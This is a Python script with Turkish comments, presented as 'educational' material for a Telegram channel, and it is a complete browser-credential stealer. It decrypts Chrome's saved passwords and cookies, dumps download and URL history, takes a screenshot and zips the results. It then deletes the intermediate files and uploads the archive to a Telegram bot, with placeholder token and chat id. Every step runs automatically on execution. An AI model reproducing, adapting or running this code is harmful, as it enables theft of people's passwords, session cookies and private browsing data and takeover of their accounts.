#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import os,shutil,sqlite3,win32crypt
from PIL import ImageGrab
import zipfile
import requests

kullanici_adi = os.getlogin()
chrome_yolu = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\'
app_data = os.getenv("APPDATA") + '\\'

def ChromePass():
    if os.path.exists(chrome_yolu + 'Login Data'):
        
        # DB'yi Kopyala
        shutil.copy2(chrome_yolu + 'Login Data', app_data + f'{kullanici_adi}_LoginData.sql')
        
        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_LoginData.sql')
        cursor = conn.cursor()
        
        # Dosya Oluştur Başlık Gir
        ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı Şifreleri\n\n'
        file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "w+") #
        file.write(ust_bilgi)
        file.close()
        
        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT signon_realm, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            # Login ve url Kolonları
            login = result[1]
            url = result[0]
            
            try:
                password = win32crypt.CryptUnprotectData(result[2])[1].decode()
                if login and url and password:
                    data = '='*100 + '\nURL: ' + url + '\nLOGIN: ' + login + '\nPASSWORD: ' + password +'\n' + '='*100
                    gelen_veri.append(data)
            except:
                pass
        
        for sonuc in gelen_veri:
            file = open(app_data + f'{kullanici_adi}_ChromePass.txt', "a+") #
            file.write(sonuc + '\n')
            file.close()

def ChromeCookies():
    if os.path.exists(chrome_yolu + 'Cookies'):
        
        # DB'yi Kopyala
        shutil.copy2(chrome_yolu + 'Cookies', app_data + f'{kullanici_adi}_Cookies.sql')
        
        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_Cookies.sql')
        cursor = conn.cursor()
        
        # Dosya Oluştur Başlık Gir
        ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı Çerezleri\n\n'
        file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "w+") #
        file.write(ust_bilgi)
        file.close()
        
        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT * from cookies')
        for result in cursor.fetchall():
            # url ve name Kolonları
            url = result[1]
            name = result[2]
            
            try:
                cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
                if url and name and cookie:
                    data = '='*100 + '\nURL: ' + url + '\nCOOKIE: ' + cookie + '\nCOOKIE NAME: ' + name +'\n' + '='*100
                    gelen_veri.append(data)
            except:
                pass
        
        for sonuc in gelen_veri:
            file = open(app_data + f'{kullanici_adi}_ChromeCookies.txt', "a+") #
            file.write(sonuc + '\n')
            file.close()

def ChromeDownloadHistory():
    if os.path.exists(chrome_yolu + 'History'):
        
        # DB'yi Kopyala
        shutil.copy2(chrome_yolu + 'History', app_data + f'{kullanici_adi}_History.sql')
        
        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_History.sql')
        cursor = conn.cursor()
        
        # Dosya Oluştur Başlık Gir
        ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı İndirme Geçmişi\n\n'
        file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "w+") #
        file.write(ust_bilgi)
        file.close()
        
        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT current_path, tab_url from downloads')
        for result in cursor.fetchall():
            # dizin ve url Kolonları
            dizin = result[0]
            url = result[1]
            
            try:
                if dizin and url:
                    data = '='*100 + '\nDizin: ' + dizin + '\nURL: ' + url +'\n' + '='*100
                    gelen_veri.append(data)
            except:
                pass
        
        for sonuc in gelen_veri:
            file = open(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt', "a+") #
            file.write(sonuc + '\n')
            file.close()

def ChromeURLHistory():
    if os.path.exists(chrome_yolu + 'History'):
        
        # DB'yi Kopyala
        shutil.copy2(chrome_yolu + 'History', app_data + f'{kullanici_adi}_History.sql')
        
        # Veri Tabanı Bağlantısı
        conn = sqlite3.connect(app_data + f'{kullanici_adi}_History.sql')
        cursor = conn.cursor()
        
        # Dosya Oluştur Başlık Gir
        ust_bilgi = '@KekikAkademi Telegram Kanalına Eğitim Amacıyla Hazırlanmıştır!' + '\n\n' + kullanici_adi + ' İsimli Bilgisayarın\nChrome Tarayıcı url Geçmişi\n\n'
        file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "w+") #
        file.write(ust_bilgi)
        file.close()
        
        # Sonuçları getir
        gelen_veri = []
        cursor.execute('SELECT title, url from urls')
        for result in cursor.fetchall():
            # baslik ve url Kolonları
            baslik = result[0]
            url = result[1]
            
            try:
                if baslik and url:
                    data = '='*100 + '\nBaşlık: ' + baslik + '\nURL: ' + url +'\n' + '='*100
                    gelen_veri.append(data)
            except:
                pass
        
        for sonuc in gelen_veri:
            try:
                file = open(app_data + f'{kullanici_adi}_ChromeURLHistory.txt', "a+") #
                file.write(sonuc + '\n')
                file.close()
            except:
                pass

def ScreenShot():
    screen = ImageGrab.grab()
    screen.save(app_data + f'{kullanici_adi}_ScreenShot.jpg')

ChromePass()
ChromeCookies()
ChromeDownloadHistory()
ChromeURLHistory()
ScreenShot()

def ZipFile():
    zip_adi = app_data + f'{kullanici_adi}_LOG.zip'
    yeni_zip = zipfile.ZipFile(zip_adi,'w')
    yeni_zip.write(app_data + f'{kullanici_adi}_ChromePass.txt')
    yeni_zip.write(app_data + f'{kullanici_adi}_ChromeCookies.txt')
    yeni_zip.write(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt')
    yeni_zip.write(app_data + f'{kullanici_adi}_ChromeURLHistory.txt')
    yeni_zip.write(app_data + f'{kullanici_adi}_ScreenShot.jpg')
    yeni_zip.close()
ZipFile()

def imha():
    os.remove(app_data + f'{kullanici_adi}_ChromePass.txt')
    os.remove(app_data + f'{kullanici_adi}_ChromeCookies.txt')
    os.remove(app_data + f'{kullanici_adi}_ChromeDownloadHistory.txt')
    os.remove(app_data + f'{kullanici_adi}_ChromeURLHistory.txt')
    os.remove(app_data + f'{kullanici_adi}_ScreenShot.jpg')
    os.remove(app_data + f'{kullanici_adi}_LoginData.sql')
    os.remove(app_data + f'{kullanici_adi}_Cookies.sql')
    os.remove(app_data + f'{kullanici_adi}_History.sql')
imha()

def TelegramSend():
    loglar = {'document': open(app_data + f'{kullanici_adi}_LOG.zip', 'rb')}
    bot_token = "XXXX:XXXX"                                # Bot Token
    chat_id = "XXXX"                                       # Chat ID
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=loglar)
TelegramSend()

os.remove(app_data + f'{kullanici_adi}_LOG.zip')